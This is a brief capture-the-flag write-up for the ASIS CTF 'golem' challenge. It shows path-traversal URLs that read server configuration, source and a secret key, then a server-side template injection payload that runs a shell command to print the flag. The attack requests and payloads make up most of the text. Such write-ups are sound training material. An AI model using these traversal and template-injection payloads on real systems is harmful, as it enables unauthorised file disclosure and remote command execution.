# golem

## LFI

`https://golem.asisctf.com/article?name=../../../../../../etc/nginx/sites-enabled/golem`

=>

location /static/ {

    root /opt/serverPython/golem;
    
    expires 30d;
    
    add_header Pragma public;
    
    add_header Cache-Control &#34;public&#34;;

}



`https://golem.asisctf.com/article?name=../../../../../opt/serverPython/golem/server.py`

=>

execfile('flag.py')

execfile('key.py')

FLAG = flag

app.secret\_key = key

...


https://golem.asisctf.com/article?name=../../../../../opt/serverPython/golem/secret.py

=>

`secret key: 7h15_5h0uld_b3_r34lly_53cur3d`


## SSTI

use the secret key to let session['golem'] = {{ config[\'RUNCMD\'](\'grep "ASIS" flag.py\',shell=True) }}

=>

`ASIS{I_l0v3_SerV3r_S1d3_T3mplate_1nj3ct1on!!}`

